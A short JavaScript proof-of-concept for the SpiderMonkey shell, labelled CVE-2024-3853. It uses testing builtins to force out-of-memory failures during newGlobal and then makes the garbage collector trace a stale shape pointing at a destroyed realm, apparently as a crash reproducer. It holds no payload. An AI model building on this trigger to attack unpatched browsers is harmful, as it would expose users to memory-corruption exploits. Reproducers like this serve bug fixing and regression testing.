// CVE-2024-3853: Use-After-Free in GC Realm Initialization
// Bug 1884427 - Destroyed realm traced via live BaseShape after OOM during newGlobal
// Run with: --fuzzing-safe --no-threads --no-baseline --no-ion
//
// oomAtAllocation value depends on build config (ASAN vs non-ASAN).
// Brute-force a range of values to find the right OOM point.
gczeal(10);
x = 1;
newGlobal();

for (let oomVal = 1; oomVal <= 30; oomVal++) {
    oomAtAllocation(oomVal);
    try { newGlobal(); } catch (e) {}
}

for (let oomVal = 1; oomVal <= 30; oomVal++) {
    oomAtAllocation(oomVal);
    try { newGlobal(); } catch (e) {}
}

for (let oomVal = 1; oomVal <= 30; oomVal++) {
    oomAtAllocation(oomVal);
    try { newGlobal(); } catch (e) {}
}

// Trigger GC tracing of stale BaseShape pointing to destroyed realm
resetOOMFailure();
newGlobal();
